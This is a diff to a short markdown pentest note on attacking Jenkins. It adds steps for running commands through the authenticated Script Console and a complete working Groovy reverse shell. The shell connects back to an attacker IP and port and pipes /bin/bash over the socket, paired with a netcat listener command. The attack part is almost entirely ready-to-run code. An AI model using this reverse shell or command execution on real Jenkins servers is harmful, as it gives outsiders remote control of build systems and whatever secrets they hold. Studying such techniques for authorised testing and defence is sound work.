@@ -4,14 +4,25 @@ Jenkins is a tool that offers a straightforward method for establishing a contin
 
 Groomy script exploitation: (need to be authenticated)
 - Go to Manage Jenkins -> Script Console
-
+- For command execution:
 ```
 def proc = "ls".execute();
 def os = new StringBuffer();
 proc.waitForProcessOutput(os, System.err);
 println(os.toString());
 ```
-
+- For reverse shell:
+On my machine:
+```
+nc -lvnp 4242
+```
+On jenkins:
+```
+String host="<my ip>";
+int port=4242;
+String cmd="/bin/bash"; # would be cmd.exe for Windows
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 ## Resources
 
 [Github Repo on Jenkins exploits](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)
